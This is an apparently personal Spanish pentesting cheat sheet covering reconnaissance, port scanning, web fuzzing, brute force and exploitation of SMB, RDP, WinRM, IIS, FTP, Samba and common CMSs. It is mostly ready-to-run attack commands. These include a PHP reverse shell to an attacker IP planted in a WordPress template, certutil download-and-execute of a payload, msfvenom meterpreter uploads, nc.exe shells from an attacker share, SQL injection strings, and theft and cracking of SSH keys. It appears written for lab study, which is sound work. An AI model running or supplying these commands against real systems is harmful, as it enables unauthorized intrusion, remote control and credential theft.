@@ -1,0 +1,553 @@
+----
+# ESCANEO PASIVO:
+- ### HERRAMIENTAS PRINCIPALES:
+	[ENUMERACION ACT Y PASS](ENUMERACION ACT Y PASS)
+	- **USAR DRAW.IO** → De esta manera nos podemos hacer una idea de la estructura de la red
+	- **nslookup** → Consulta registros DNS (A, MX, NS, TXT) para obtener información sobre el dominio.  `nslookup example.com`
+	- **dig** → Herramienta avanzada para consultar registros DNS con más detalle que nslookup.  `dig example.com`
+	- **httrack** → permite descargar una web completa para analizar su estructura, archivos, rutas y código offline.(buscar mirroring, backups, etc)  `httrack http://example.com`
+	- **whois** → Obtiene información pública del registro del dominio (empresa, fechas, DNS, contacto técnico).  `whois example.com`
+	- **netcraft** → Recoge información pública sobre hosting, tecnologías usadas, historial del servidor y posibles cambios de infraestructura. WEB → SITE REPORT
+	- **dnsrecon** → herramienta para enumerar registros DNS de un dominio. Busca: A,AAAA,MX,NS,SOA.  `dnsrecon -d sitioweb.org`
+	- **wafw00f** → herramienta de reconocimiento que detecta si una web está protegida por un WAF y cuál es. `wafw00f sitioweb.org`
+	- **sublist3r** → herramienta de GitHub que enumera subdominios usando múltiples motores de búsqueda y fuerza bruta. `sublist3r -d sitioweb.org`
+	- **google dorks** → uso avanzado del buscador con operadores para filtrar información sensible. `MIRAR ENLACE`
+	- **theHarvester** → herramienta de GitHub que busca **emails**, **subdominios** y **nombres** usando motores de busqueda. `theHarvester -d sitioweb.org -b google`
+	- **mirar codigo fuente y ctrl +c**
+# ESCANEO ACTIVO:
+- ### DESCUBRIMIENTO DE HOST:
+	[ENUMERACION ACT Y PASS](ENUMERACION ACT Y PASS)
+	- #### DESCUBRIR HOSTS:
+		- **nmap** → Escáner de red para descubrir hosts. Descubrimiento de hosts (sin escaneo de puertos).  `nmap -sn 10.10.10.0/24`
+		- **crear una carpeta por cada ip** → orden y limpieza
+		- **f-ping** → Permite hacer ping a múltiples hosts rápidamente.  `fping -a -g 10.10.10.0/24`
+		- **masscan** → Es como Nmap… pero **ultrarrápido**. `sudo masscan -p 0-10000 192.168.1.0/24 --rate=10000` 
+	- **traceroute** → Para detectar el numero de routers, cada salto suele ser uno.
+	- **axfr** →  intenta realizar una **transferencia de zona completa**.  devuelve todos los registros DNS: subdominios, correos, etc. `dig axfr @nsztm1.dig.ninja zonetransfer.me`
+	- **netdiscover** → herramienta que utiliza peticiones **ARP** para descubrir hosts activos en una red local.  `netdiscover -i eth0 -r 192.168.2.0/24`
+	- **/etc/hosts** → Archivo local que asocia **dominios ↔ IPs manualmente**.(mirarlo por si vemos varios objetivos o para obtener la ip)
+	- **ping** → Comprueba si un host está activo mediante ICMP.  `ping 10.10.10.5`
+	- **arp-scan** → Escanea la red local usando ARP para descubrir dispositivos activos. `arp-scan -l`
+- ### DESCUBRIMIENTO DE PUERTOS (se puede hacer desde MSF):
+	- **nmap -sA** → Sirve para detectar si hay **firewall o filtrado** (no enumera puertos abiertos, detecta si están filtrados o no) `nmap -sA 10.10.10.5`
+	- **nmap -Pn (TCP)** → Omite el ping inicial (host discovery) y asume que el host está activo. Útil cuando ICMP está bloqueado por firewall. 
+		- `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.111.36 -oG allports`
+		- `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.111.36,45,46,55 -oN tcp_scan.txt` → Guardar todos los puertos de todas las maquinas
+		- `grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','`→ Extraer solo los puertos
+		- `nmap -p puertos --open -sVC 192.168.111.36,44,54 -Pn -oN Full_scan.txt` → para abirlo como un archivo `mousepad Full_scan.txt&` y `disown`
+		- *CREAR CARPETA POR CADA IP*
+		- `nmap -p 80,443 -script http-enum 192.168.111.36 -oN webContent`
+	- **nmap -sU (UDP)** → Escaneo de puertos **UDP**. `nmap -sU --open -v -T5 10.10.10.10` HACER POR SI ACASO!!!! no solo tcp
+	- **DESDE METASPLOIT `(se guarda automaticamente en DB)`**
+		- `service postgresql start && msfconsole`
+		- `workstation -a nombre`
+		- `db_nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.10`
+		- `db_nmap -p puertos -sCV 10.10.10.10`
+		- `db_nmap -p --script http-enum 10.10.10.10`
+- ### ARCHIVOS A MIRAR:
+	- **robots.txt** → archivo que indica a los buscadores qué rutas no indexar. Puede revelar carpetas ocultas, paneles de admin, backups y tecnología usada (ej. WordPress, PHP).
+	- **sitemap.xml** → archivo que muestra la estructura del sitio. Revela rutas, autores, categorías y páginas que a veces no aparecen en la web.
+- ### FINGERPRINTING:
+	- **whatweb** → Detecta tecnologías web usadas (CMS, frameworks, servidores, versiones). `whatweb http://example.com
+	- **Wappalyzer** → Identifica tecnologías del sitio (frontend, backend, librerías, CMS).
+	- **BuiltWith** → Perfil tecnológico completo del sitio web.
+- ### VIRTUAL HOSTING:
+	- *nvim /etc/hosts* → Añadir subdominios
+- ### DESCUBRIMIENTO DE SERVICIOS Y VERSIONES:
+	[SERVICIOS Y VERSIONES](ENUMERACION)
+	- `nmap -p puertos -sVC 192.168.111.36 -oN targeted`
+	- `nmap -p 80,443 -script http-enum 192.168.111.36 -oN webContent`
+	- **searchsploit** → **buscar exploits públicos desde tu terminal**, usando la base de datos local de **Exploit-DB**.
+	- **EN CASO DE WEB CON SSL/TLS `(443)`**:
+		- **gobuster** → añadir `-k` (para certificados invalidos o autofirmados.)
+		- **wfuzz** → añadir `--no-check-certificate`
+		- **dirbuster** 
+		- `openssl s_client -connect ip:puerto` -> lista info sobre el certificado en *CN*(commun name) puede dar *subdominios*.
+	- **BANNER GRABBING:** consiste en **obtener información de un servicio** conectándose a él y leyendo el _banner_ que devuelve.(SSH,HTTP,FTP,MYSQL,SMTP)
+		- `nmap -sV --script banner <IP>`
+		- `nc ip_target puerto`
+		- `ftp ip_target`
+		- `curl -I http://ip_target
+	- **gobuster** → Herramienta de **fuerza bruta de rutas, archivos y subdominios** en aplicaciones web. (SI HAY VIRTUAL HOSTING FUZZEAR TAMBIEN LA IP)
+		- `gobuster dir -u http://board.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --no-error`
+		- `gobuster vhost -u http://alert.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 200 -r`
+		- para .git: `gobuster dir -u http://board.htb -w /usr/shar/seclist/discovery/webcontent/common.txt -t 200 --no-error` o manual `http://ip/.git`
+	- **wfuzz** → Herramienta de **fuzzing web** que permite probar múltiples valores en parámetros, rutas, cabeceras o formularios para descubrir contenido oculto o vulnerabilidades.  (SI HAY VIRTUAL HOSTING FUZZEAR TAMBIEN LA IP)
+		- `wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.target.com" http://target.com`
+		- `wfuzz -c -L -hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://ip_target/FUZZ`
+		- `--hl=x`: ocultar las que tengan el numero de lineas igual a x.
+		- `--hh=x`: ocultar las que tengan el numero de caracteres igual a x.
+		- Si es una web con muchas palabras: `cewl -w diccionario.txt http://ip_target` → nos crea un **diccionario personalizado**.
+			- `wfuzz -c -L -hc=404 -t 200 -w diccionario.txt http://ip/FUZZ`
+	- **nikto** → Escáner de **vulnerabilidades web** que busca configuraciones inseguras, archivos peligrosos y fallos conocidos en servidores web.
+		- `nikto -h http://10.10.10.5/` → Busca **archivos peligrosos** (`/phpinfo.php`, `/admin/`), **versiones vulnerables**, **configuraciones inseguras**, **métodos HTTP habilitados** (PUT, DELETE…) y **problemas en cabeceras de seguridad**.
+	- **dirbuster** → herramienta para hacer **fuerza bruta de directorios y archivos en aplicaciones web**.
+		- *COMANDO* → `dirbuster`
+		- *REPO* → `usr/share/wordlist/directory-list-lowercase-2.3-medium.txt'
+	- **dirb** → Herramienta de **fuerza bruta de directorios y archivos web**. Sirve para descubrir rutas ocultas (similar a gobuster y wfuzz `LENTO Y VIEJO`).
+		- `dirb http://example.com /usr/share/wordlists/dirb/common.txt`
+		- `dirb http://example.com -X .php,.txt,.bak`
+	- **enum4linux** → Herramienta de enumeración de servicios **SMB/Samba** en sistemas Windows o Linux.
+		- *Enumeración básica* → `enum4linux 10.10.10.5`
+		- *Enumeración de usuarios* → `enum4linux -U 10.10.10.5`
+		- *Enumeración de shares* → `enum4linux -S 10.10.10.5`
+		- *Enumeración con credenciales* → `enum4linux -u user -p pass 10.10.10.5`
+	
+	- **sqlmap** → herramienta automática para detectar y explotar **inyecciones SQL (SQLi)**.
+		- *BASICO* → interceptar con *burp* para ver la request, el *target* y sus *campos* →Guardar la request desde el *http history* → click derecho → *copy to file*
+			- `sqlmap -r request` → ir contestando las preguntas
+		- *OTRA* → vemos algo como `http://target/product.php?id=1` → `sqlmap -u "http://target/product.php?id=1" --batch`
+		- *LISTAR BD* → `sqlmap -u "http://target/page.php?id=1" --dbs`
+		- *LISTAR TABLAS* → `sqlmap -u "http://target/page.php?id=1" -D nombre_db --tables`
+		- *EXTRAER DATOS* → `sqlmap -u "http://target/page.php?id=1" -D db -T users --dump`
+		- *CONTRA LOGIN* → `sqlmap -u "http://target/login.php" --data="username=admin&password=test" -p username`
+		- *SI HAY COOKIES* → `sqlmap -u "http://target/login.php" --data="username=admin&password=test" --cookie="PHPSESSID=abc123" -p username`
+
+- ### ENUMERACION Y EXPLOTACIÓN:
+	[ENUMERACION](ENUMERACION)
+	- **SI VEMOS UN LOGIN** → buscar credenciales por defecto, buscarlo en *searchsploit* y *internet (incluir version)* y probar *SQLI*. (Hydra si es necesario`hydra -L users.txt -P password.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"`)
+		- *SQLI* → `'OR 1=1-- -`, `'OR 1=1;-- -`, `' OR 1=1#`, `' OR 1=1#`
+	- **PROBAR REUTILIZACION DE CREDENCIALES!!**
+	- **SI VEMOS SMTP** → es el protocolo que se usa para **enviar correos electrónicos** entre servidores. **Puertos tìpicos:** `25` (SMTP ), `587` (con autenticación), `465` (SMTP sobre SSL).
+		- *ENUMERACION DE USUARIOS* → `use auxiliary/scanner/smtp/smtp_enum` y `set USER_FILE users.txt`
+		- *ENUMERACION DE VERSION* → `use auxiliary/scanner/smtp/smtp_version`
+		- *PROBAR USUSARIOS EN SSH, FTP,...*
+	- **SI VEMOS UN WORDPRESS** → sistema que permite crear y administrar páginas web **sin tener que programar desde cero**.
+		- *ENUMERACIÓN BÁSICA* → `wpscan --url http://target` → `searchsploit plugins y versiones
+		- *ENUMERACION USUARIOS* → ver las *entradas*(publicaciones) dicen el autor o probar usuarios en login mirando el *mensaje de error* (chivato mal config) comandos: `wpscan --url http://target -e u`(usuarios), `wpscan --url http://target -e p`(plugins)
+		- *FUERZA BRUTA* → fuerza bruta contra login `wpscan --url http://ip_target -U user -P list.txt`
+		- *RUTAS* → `/wp-admin`, `/wp-content`, `/wp-includes`, `/wp-config.php`(*creds*), `/wp-content/plugins/`(*mirar en MSF vuln*) → *duplicator*,                 `/wp-json/wp/v2/users`(*users*)
+		- *RCE* → Si conseguimos log como *admin* → aperance(editor) → *404 template* → borramos lo que hay y `<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.38/443 0>&1'") ?>`*(sin ;)* → listar un file que no existe para que se ejecute -> `curl -s -X GET "http://ip/noexisto"` o       `curl -s -X GET "http://ip/?p=404.php"`
+	- **SI VEMOS DRUPAL** → CMS modular basado en PHP.
+		- *ENUMERACION BASICA* → `droopescan scan drupal -u http://target` y revisar `/CHANGELOG.txt`(a veces *version exacta*)
+		- *ENUMERACION DE USUARIOS* → `droopescan scan drupal -u http://target -e u` → rutas → `/user/1` y `/user/login`
+		- *FUERZA BRUTA* → `hydra -l admin -P passwords.txt target http-post-form "/user/login:name=^USER^&pass=^PASS^:F=Sorry"
+		- *RUTAS* → `/user/login`, `/user/register`,`/sites/`,`/sites/default/`,`/sites/default/settings.php`(*credenciales BD*),`/modules/`,`/themes/`
+		- *VERSIONES VULNERABLES* → **Drupalgeddon 1 (Drupal 7)** y **Drupalgeddon 2 (Drupal < 8.5.1)** → `use exploit/unix/webapp/drupal_drupalgeddon2`
+	- **SI VEMOS JOOMLA** → CMS para crear webs dinámicas con componentes y módulos.
+		- *ENUMERACIÓN BÁSICA* → `joomscan -u http://IP_target` → detectar versión y componentes
+		- *ENUMERACIÓN USUARIOS* → Mirar autor de artículos, Probar enumeración en `/index.php?option=com_users`, Buscar API expuesta, Fuerza mensajes de error en login (usuario existe vs no existe).
+		- *FUERZA BRUTA* → `hydra -l admin -P rockyou.txt target http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^:F=Username and password do not match"` → Cambiar mensaje de error.
+		- *RUTAS* → `/administrator/`(*panel admin*),`/components/`,`/modules/`,`/templates/`,`/configuration.php`(*credenciales BD*)
+		- *VERSIONES VULNERABLES* → **Joomla 3.7.0** → SQLi
+	- **NUCLEI** → es un **scanner basado en plantillas** que busca vulnerabilidades conocidas, malas configuraciones y exposiciones típicas.
+		- *ACTUALIZAR PLANTILLAS* → `nuclei -update-templates`
+		- *VALIDACION BASICA* → `nuclei -u http://target`
+		- *BUSQUEDA* → `nuclei -u http://target -severity low,medium,high,critical`
+		- *WORDPRESS* → `nuclei -u http://target -tags wordpress`
+		- *LFI* → `nuclei -u https://target.com -t lfi`→ busca *LFI*.
+- ### LINKS:
+	- [[WINDOWS VULNERABILITIES]] → VULNERABILIDADES TIPICAS TANTO *WINDOWS* COMO *LINUX* (*ETERNALBLUE, BLUEKEEP, ...* )
+	- [[LINUX]] → *VSFTPD, WEBSHELL, CGI, PHP*
+	- [[WINDOWS]] → *MICROSOFT ISS + FTP, OPENSSH, MYSQL, SMB*
+	- [ENUMERACION](ENUMERACION) → ENUMERACION BASICA *FTP, SMB, MYSQL, WEBSERVER, SSH, SMTP*
+	- [[NETWORK ATTACKS]] → *NETBIOS, SMB, SNMP*
+	- [[VULNERABILITY SCANNING OVERVIEW]] → *COMPILAR PROGRAMAS EN MAQUINA VICTIMA*
+	- **[https://www.revshells.com](https://www.revshells.com/)** → *GENERADOR DE REVERSE SHELL DE TODO TIPO*
+- ### WINDOWS:
+	[[WINDOWS CREDENTIALS DUMPING]]
+	[[WINDOWS FILE SYSTEM VULNERABILIITES]]
+	**PROBAR FUERZA BRUTA CON HYDRA**
+	- **SMB/NetBios** → protocolo que sirve para **compartir recursos en red**, principalmente en entornos Windows.
+		- *SI VEMOS VERSION ANTIGUA*  → `nmap -p445 --script="smb-vuln-*" ip_target` → Nos reporta si es vulnerable (*ms17*, *ms08*...)
+		- *ETERNALBLUE*
+			- *COMPROBAR* → `nmap -p 445 --script smb-vuln-ms17-010 IP` o `use auxiliar/scanner/smb/smb_ms17_010`
+			- *EXPLOTACION* → `use exploit/windows/smb/ms17_010_eternalblue | set PAYLOAD windows/x64/meterpreter/reverse_tcp               | set LHOST TU_IP | set LPORT 4444 run`
+		- *NORMAL*
+			- *BANNER GRABBING* → `nc -nv <IP> 445` (NOS DA LA VERSION EXACTA)
+			- *ENUMERACION GORDA* → `enum4linux IP` y `enum4linux -a IP` o con *creds* `enum4linux -a -u user -p pass ip` → enumera usuarios
+			- *ENUMERACION USERS* → `crackmapexec smb ip_target -u '' -p '' --users`
+			- *ENUMERAR SHARES* → `smbclient -L //IP -N` y `smbclient -L //IP -U user`
+			- *LISTAR PERMISOS* → `smbmap -H IP | smbmap -H IP -u null | smbmap -H IP -u user -p pass`
+			- *PWNED* → `nxc smb IP -u '' -p '' --shares` y `nxc smb IP --shares`
+			- *ACCEDER A SHARES* → `smbclient //IP/SHARE -U user` y `smbclient //IP/SHARE -N` → `ls`, `ls -la`, `get`, `prompt`+`mget *`
+			- *FUERZA BRUTA* → `hydra -L users.txt -P passwords.txt smb://IP` o `crackmapexec smb ip -u user -p passwoerd.txt` PROBAR CON TODAS LAS HERRAMIENTAS!!!! PUEDEN FALLAR → `smbmap -H ip_traget -u user -p pass` → probar a mano si son pocas → PROBAR DICCIONARIO CUSTOM DE USUARIOS TANTO EN USERS COMO EN CONTRASEÑAS.
+			- *RCE* → `impacket-psexec Administrator@IP` -> necesitas *creds* o *NTLM*.
+			- *SI TENEMOS ACCESO A WEB* → subir una reverse shell → *revshells.com* → **MSFVenom** → (escoger stageless) → cambiar a *.aspx* (si hace falta o a otro)                              → subirlo con `put reverse.aspx` → apuntar a el recurso.
+				- *PONERNOS EN ESCUCHA* → `nc -nvlp 443`
+				- *REVERSE SHELL METERPRETER* → *revshells.com* → **MSFVenom** → *Meterpreter*(escoger stageless) → cambiar a *.aspx* (si hace falta o a otro)
+					- *UPLOAD* → si lo subimos desde una reverse shell → `python -m http.server 80` → `cd Tempo /Public/Downloads` → `certutil -f -urlcache http://ip/reverse.exe reverse.ex` →  `.\reverse.exe` 
+					- *LISTEN* → `msfconsole` → `use multi/handler` → `set LHOST nuestra_ip | set LPORT 443` → `set payload payload_de_la_reverse_shell_usada` →  `run`
+		- *MSF*
+			- *ENUM USERS* → `use auxiliary/scanner/smb/smb_enumusers
+			- *ENUM SHARES* → `use auxiliary/scanner/smb/smb_enumshares | set ShowFiles true run`
+			- *FUERZA BRUTA* → `use auxiliary/scanner/smb/smb_login` 
+	- **RDP** → es un protocolo de Microsoft que permite conectarse *remotamente a un sistema Windows* obteniendo una *interfaz gráfica (GUI) completa.*
+		- *BLUEKEEP* `NT AUTHORITY\SYSTEM`
+			- *COMPROBAR SI ES VULN* → `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`
+			- *EXPLOIT* → `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` → `show targets` → `set TARGET X` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST TU_IP set LPORT 4444 run`
+		- *MSF*
+			- *COMPROBAR QUE ESTÁ Y VERSION Y NLA* → `use auxiliary/scanner/rdp/rdp_scanner`
+			- *ENUMERAR INFO* → `use auxiliary/scanner/rdp/rdp_info`
+			- *BRUTE FORCE LOGIN* → `use auxiliar/scanner/rdp/rdp_login
+		- *NORMAL*
+			- *ENUMERAR INFO* → `nmap --script rdp-ntlm-info -p3389 ip_target`
+			- *BRUTE FORCE* → `nxc rdp ip_target -u users.txt -p passwd.txt`o ``hydra -L users.txt -P passwds.txt rdp://IP_OBJETIVO -s 3333`
+			- *CONEXION* → `xfreerdp /u:USUARIO /p:CONTRASEÑA /v:IP_OBJETIVO:PUERTO`
+	- **WINRM** → *Windows Remote Management* es un servicio de *administración remota por línea de comandos*.
+		- *NORMAL*
+			- *BRUTE FORCE* → `nxc winrm IP_OBJETIVO -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
+			- *RCE* → `nxc winrm IP -u usuario -H HASH_NTLM`(*Pwned!*) → `nxc winrm IP -u usuario -H HASH_NTLM -x "whoami"`
+			- *SHELL INTERACTIVA* → `evil-winrm -u 'USER' -p 'PASS' -i IP_OBJETIVO`
+		- *MSF*
+			- *BRUTE FORCE* → `use auxiliary/scanner/winrm/login`
+			- *RCE* → `use exploit/windows/winrm/winrm_cmd | set CMD comando`
+			- *SESION METERPRETER* → `use exploit/windows/winrm/winrm_script_exec set RHOSTS IP_OBJETIVO set USERNAME USER set PASSWORD PASS.`  `set FORCE_VBS true`(PROBAR SI NO FUNCIONA DE NORMAL)
+	- **MICROSOFT IIS** → *Servidor web de Microsoft* que se ejecuta en *Windows Server*.
+		- *MICROSOFT ISS + FTP* → FTP suele apuntar al **directorio web de IIS**
+			- *ACCESO ANONIMO* → `ftp <IP>` → user: `anonymous` → pass: `enter`
+			- *BRUTE FORCE FTP* → `hydra -L /path/unix_users.txt -P /path/unix_passwords.txt ftp://<IP>`
+			- *EXPLOIT* → (SI NO VA CON *.asp* PROBAR *.aspx*) `ftp <IP>` → si vemos `.asp/.aspx` → `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=443 -f aspx > shell.aspx` → `put shell.aspx dir` → ponernos en escucha → `msfconsole use multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST <TU_IP> set LPORT 443 run` → apuntar al archivo → `http://<IP>/shell.aspx` 
+		- *BADBLUE* → Si vemos *BadBlue/2.7*
+			- *EXPLOIT* → `use exploit/windows/http/badblue_passthru` → migrar a lsass.exe o explorer.exe
+		- *REJETTO HFS* → **Rejetto HFS 2.3**
+			- *EXPLOIT* → `use exploit/windows/http/rejetto_hfs_exec`→ Si el sistema es *x64* → `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+		- *MICROSOFT IIS + WEBDAV*  → **extensión de HTTP** que permite **subir, modificar y borrar archivos en un servidor web**.
+			- *IDENTIFICACION* → Buscar un directorio `/webdav` y `nmap --script http-webdav-scan -p80 ip_target` o `gobuster/wfuzz common.txt`
+			- *BRUTE FORCE AL DIRECTORIO* → `hydra -L users.txt -P passwds.txt IP_TARGET http-get /webdav/`
+			- *DAVTEST* → comprobar si WebDAV permite **subir archivos**  y  detectar **qué extensiones ejecutables están permitidas** → `davtest -auth usuario:password -url http://IP/webdav/`
+			- *CADAVER* → **cliente WebDAV interactivo**, similar a un FTP.
+				- *CONECTARSE* → Pide creds → `cadaver http://IP/webdav/`
+				- *SUBIR UNA WEBSHELL* → `put /usr/share/webshells/asp/webshell.asp`
+				- *REVERSE SHELL* → `\\IP_ATACANTE\smbFolder\nc.exe -e cmd IP_ATACANTE 443`
+					- *SERVER PARA NC.EXE* → `impacket-smbserver smbFolder $(pwd) -smb2support`
+					- *LISTENER* → `rlwrap nc -nvlp 443
+- ### LINUX:
+	[[LINUX]]
+	[[LINUX CREDENTIALS DUMPING]]
+	[[EXPLOITING LINUX VULNERABILITIES]]
+	**PROBAR FUERZA BRUTA CON HYDRA**
+	- **FTP** → es un protocolo usado para **transferir archivos** entre cliente y servidor.  
+		- *NORMAL* → Mala configuración.
+			- *MSF*
+				- *VERSION* → `use auxiliary/scanner/ftp/ftp_version set RHOSTS IP run`
+				- *BRUTE FORCE* → `use auxiliary/scanner/ftp/ftp_login set RHOSTS IP set USER_FILE users.txt set PASS_FILE passwords.txt run`
+				- *ACCESO ANONIMO* → `use auxiliary/scanner/ftp/anonymous set RHOSTS IP run`
+			- *MANUAL*
+				- *ENUMERACION* → `nmap -p 21 --script ftp-* ip_target`
+				- *ANONIMO* → `ftp ip_target` user: `anonymous` pass: `enter`
+				- *DESCARGAR ARCHIVO* → `get nombre_archivo`
+		- *VSFTPD* → **vsftpd 2.3.4** *Backdoor Command Execution*
+			- *EXPLOIT* → `use exploit/unix/ftp/vsftpd_234_backdoor` → `/bin/bash -i` (parece que no hay shell pero si) → `background` `use shell_to_meterpreter` -> para meterpreter (post-explotacion) → `set LHOST nuestra_ip` → `set SESSION nº session de la shell
+		- *ProFTP* → **ProFTP 1.3.3c** *Backdoor*
+			- *EXPLOIT* → `use exploit/unix/ftp/proftpd_133c_backdoor
+		- *ProFTP* → **ProFTPD** *mod_copy*
+			- *EXPLOIT* → `use exploit/unix/ftp/proftpd_modcopy_exec
+	- **SAMBA** → es un **protocolo de compartición de archivos y recursos** usado en redes locales.
+		-  *SI VEMOS VERSION ANTIGUA*  → `nmap -p445 --script="smb-vuln-*" ip_target` → Nos reporta si es vulnerable (*ms17*, *ms08*...)
+		- *ETERNALBLUE*
+			- *COMPROBAR* → `nmap -p 445 --script smb-vuln-ms17-010 IP` o `use auxiliar/scanner/smb/smb_ms17_010`
+			- *EXPLOTACION* → `use exploit/windows/smb/ms17_010_eternalblue | set PAYLOAD windows/x64/meterpreter/reverse_tcp | set LHOST TU_IP | set LPORT 4444 run`
+		- *NORMAL*
+			- *BANNER GRABBING* → `nc -nv <IP> 445` (NOS DA LA VERSION EXACTA)
+			- *ENUMERACION GORDA* → `enum4linux -a IP` o con *creds* `enum4linux -a -u user -p pass ip` 
+			- *ENUMERAR SHARES* → `smbclient -L //IP -N` y `smbclient -L //IP -U user`
+			- *LISTAR PERMISOS* → `smbmap -H IP -u null smbmap -H IP -u user -p pass`
+			- *PWNED* → `nxc smb IP --shares`
+			- *ACCEDER A SHARES* → `smbclient //IP/SHARE -U user`
+			- *FUERZA BRUTA* → `hydra -L users.txt -P passwords.txt smb://IP` o `crackmapexec smb ip -u user -p passwoerd.txt` PROBAR CON TODAS LAS HERRAMIENTAS!!!! PUEDEN FALLAR → `smbmap -H ip_traget -u user -p pass` → probar a mano si son pocas → PROBAR DICCIONARIO CUSTOM DE USUARIOS TANTO EN USERS COMO EN CONTRASEÑAS.
+			- *RCE* → `impacket-psexec Administrator@IP` -> necesitas *creds* o *NTLM*.
+			- *SI TENEMOS ACCESO A WEB* → subir una reverse shell → *revshells.com* → **MSFVenom** → (escoger stageless) → cambiar a *.aspx* (si hace falta o a otro)                              → subirlo con `put reverse.aspx` → apuntar a el recurso.
+				- *PONERNOS EN ESCUCHA* → `nc -nvlp 443`
+				- *REVERSE SHELL METERPRETER* → *revshells.com* → **MSFVenom** → *Meterpreter*(escoger stageless) → cambiar a *.aspx* (si hace falta o a otro)
+					- *UPLOAD* → si lo subimos desde una reverse shell → `python -m http.server 80` → `cd tmp` → `certutil -f -urlcache http://ip/reverse.exe reverse.exe` →  `./reverse.exe`
+					- *LISTEN* → `msfconsole` → `use multi/handler` → `set LHOST nuestra_ip | set LPORT 443` → `set payload payload_de_la_reverse_shell_usada` →  `run`
+		- *MSF*
+			- *ENUM USERS* → `use auxiliary/scanner/smb/smb_enumusers
+			- *ENUM SHARES* → `use auxiliary/scanner/smb/smb_enumshares | set ShowFiles true run`
+			- *FUERZA BRUTA* → `use auxiliary/scanner/smb/smb_login`
+		- *SAMBA 3.0.20* 
+			- *EXPLOIT* → `use exploit/multi/samba/usermap_script set RHOSTS <IP> run`
+		- *SAMBA smbd 3.x - 4.x* → `V3.5.0`
+			- *EXPLOIT* → `use exploit/windows/smb/is_know_pipename`
+- ### COMPARTIDO:
+	- **RPC/RPCBing** → también llamado `portmapper` es un servicio que **le dice al cliente qué puertos usan otros servicios RPC**
+		- *ENUMERACION SERVICIOS RPC DISPONIBLES*  → `rpcinfo -p <IP>`
+	- **NFS** → permite **compartir carpetas entre máquinas Linux** como si fueran locales.
+		- *ENUMERACION BÁSICA permite*  → `showmount -e <IP>` → si vemos `*` Significa que cualquiera puede montarlo.
+		- *MONTARLO* → `mkdir /mnt/nfs` → `mount -t nfs <IP>:/home /mnt/nfs` → `ls -la /mnt/nfs`
+		- *UNA VEZ MONTATO VECTOR TIPICO* → `cp /mnt/nfs/user/.ssh/id_rsa .` → `chmod 600 id_rsa` → para dentro por ssh.
+			- *SI ESTA CIFRADA LA ID_RSA* → `ssh2john id_rsa > hashes.txt`→ `john --wordlist=/usr/share/wordlist/rockyou.txt hashes.txt
+	- **MYSQL** → es un **sistema gestor de bases de datos relacional** muy utilizado en aplicaciones web, especialmente en **WordPress**, junto con PHP.
+		- *MSF*
+			- *VERSION* → `use auxiliary/scanner/mysql/mysql_version
+			- *BRUTE FORCE* → `use auxiliary/scanner/mysql/mysql_login
+			- *EJECUTAR CONSULTAS* → `use auxiliary/admin/mysql/mysql_sql set RHOSTS IP set USERNAME usuario set PASSWORD contraseña set SQL "SELECT user, host FROM mysql.user;" run`
+			- *VOLCAR ESQUEMA* → `use auxiliary/scanner/mysql/mysql_schemadump
+		- *MANUAL*
+			- *REUTILIZACION DE CREDENCIALES!!!*
+			- *BRUTE FORCE* → `hydra -l root -P passwd.txt mysql://ip_target` o `medusa -h ip_target -u root -P passwd.txt -M mysql
+			- *CONEXION* → `mysql -h IP -u root -p`
+			- *COMANDOS* → `SHOW DATABASES; | USE NOMBRE | SHOW TABLES; | SELECT * FROM USERS;
+	- **SNMP** → *UDP* → es un protocolo que sirve para **monitorizar y gestionar dispositivos en red**. (DA INFO UTIL)
+		- *VERSION* → `nmap -sU -p 161 --script snmp-version IP`
+		- *BRUTE FORCE COMMUNITY STRINGS* → `nmap -sU -p 161 --script snmp-brute IP`
+		- *TODOS LOS SCRIPT* → `nmap -sU -p 161 --script snmp-* IP > snmp_info`
+		- *ENUMERACION* → `nmap --script snmp-interfaces -p161 -sU 10.129.228.93`
+		- *ENUM USANDO COMMUNITY STRINGS* → `snmpwalk -v 1 -c public IP` y `snmpwalk -v2c -c public target` `snmpwalk -v2c -c private target
+		- *INFO DEL SISTEMA* → `snmpwalk -v 2c -c public IP 1.3.6.1.2.1.1`
+		- *INTERFACES RED* → `snmpwalk -v 2c -c public IP 1.3.6.1.2.1.2`
+		- *ENUM USERS* → `snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25`
+		- *PROCESOS CORRIENDO* → `snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2`
+	- **SSH** → protocolo que permite **conectarte de forma remota y segura a otra máquina** para controlarla por terminal.
+		- *OPENSHH*
+			- *NORMAL*
+				- *BRUTE FORCE* → `hydra -L /path/unix_users.txt -P /path/unix_passwords.txt ssh://<IP>`
+				- *BRUTE FORCE* → `nxc ssh ip_target -u user -p passwords.txt` → usar usuarios típicos root, admin
+				- *BUSCAR ID_RSA* → Buscar claves privadas filtradas en la maquina, (path traversal, information leaked,...) `ssh -i id_rsa user@ip_target`
+				- *ACCESO* → `ssh <usuario>@<IP>`
+			- *MSF*
+				- *BRUTE FORCE* → `use auxiliary/scanner/ssh/ssh_login` → Crea acceso.
+				- *UPGRADE SESION A METERPRETER* → `sessions sessions -u 1`
+		- *CRC32* → Poco probable *OpenSSH < 4.3*
+			- *EXPLOIT* → `use exploit/linux/ssh/openssh_crc32
+	- **HTTP** →
